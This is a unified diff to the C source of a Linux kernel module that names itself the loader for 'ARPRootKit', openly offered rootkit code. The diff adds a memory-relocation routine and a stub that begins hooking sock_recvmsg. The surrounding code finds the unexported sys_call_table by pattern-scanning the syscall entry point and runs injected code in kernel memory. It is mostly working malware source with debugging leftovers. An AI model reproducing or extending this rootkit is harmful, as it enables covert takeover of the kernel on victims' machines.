@@ -22,6 +22,7 @@
 /*
  * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
  */
+#include <linux/net.h>
 #include <asm/cpu_entry_area.h>
 #include <asm/msr.h>
 #include <linux/set_memory.h>
@@ -54,6 +55,8 @@
  */
 #include "shared_kernel.h"
 
+#include "hook_handlers.h"
+
 /*
  * Loader declarations.
  */
@@ -61,6 +64,26 @@
 int disassemble(void *code, size_t code_len);
 void *search_sct(void);
 void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
+void hook_kernel_funcs(void);
+int relocate(unsigned char *start, unsigned char *end, unsigned long base, unsigned long from)
+{
+    int count = 0;
+    unsigned char *s;
+    unsigned long size = (unsigned long) end - (unsigned long) start;
+
+    pinfo("relocating start at %p, end %p\n", start, end);
+    base -= (unsigned long) from;
+    for (s = start; s <= (end); s++) {
+        unsigned int *p = (unsigned int *) s;
+        if ((*p >= (unsigned int) from) && (*p <= (((unsigned int) (from + size))))) {
+            *p += base;
+            s += 3;
+            count++;
+        }
+    }
+    pinfo("relocate: %d relocations made\n", count);
+    return count;
+}
 
 /*
  * Global variables.
@@ -102,10 +125,12 @@ int init_module(void)
      */
     *f_sys_write() = (*sys_call_table())[__NR_write]; // now we can print into stdout and stderr =)
 
+/*
 	pinfo("%p\n", __rdmsr(MSR_LSTAR));
 	char *p = __rdmsr(MSR_LSTAR);
 	p[0] = 0x90;
 	disassemble(p, 1);
+*/
 /*	void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
             unsigned long start, unsigned long end, gfp_t gfp_mask,
             pgprot_t prot, unsigned long vm_flags, int node,
@@ -130,7 +155,7 @@ int init_module(void)
 		disassemble((unsigned long)get_cpu_entry_area(i) + 0x5000, 0x3c);
 	}
 	*/
-	return 0;
+//	return 0;
 
 	pinfo("Hurra! sys_call_table = %p\n", *sys_call_table());
 
@@ -162,10 +187,12 @@ int init_module(void)
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
 
-		pinfo("ARPRootKit successfully installed!\nAutomatically unloading this module, by returning error: EPERM.\n");
+		hook_kernel_funcs();
+
+		//pinfo("ARPRootKit successfully installed!\n");
 
 		// uncomment for testing:
-		(*f_kfree())(kernel_addr);
+		//(*f_kfree())(kernel_addr);
 
 	} else {
 		perr("can not allocate memory.\n");
@@ -176,6 +203,10 @@ int init_module(void)
 
 void cleanup_module(void)
 {
+}
+
+void hook_kernel_funcs(void) {
+	disassemble(sock_recvmsg, 0x20);
 }
 
 int disassemble(void *code, size_t code_len) {
@@ -225,13 +256,13 @@ void *search_sct(void) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	// DO NOT call disassemble() in this function as sys_write is not yet imported!
 	// or import sys_write into f_sys_write before calling:
-	*f_sys_write() = kallsyms_lookup_name("sys_write");
+	//*f_sys_write() = kallsyms_lookup_name("sys_write");
 	//disassemble(sct, 0x3c);
 	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
 	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		disassemble(sct, 0x100);
+		//disassemble(sct, 0x100);
 		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
 		if (sct) {
 			sct += 3;
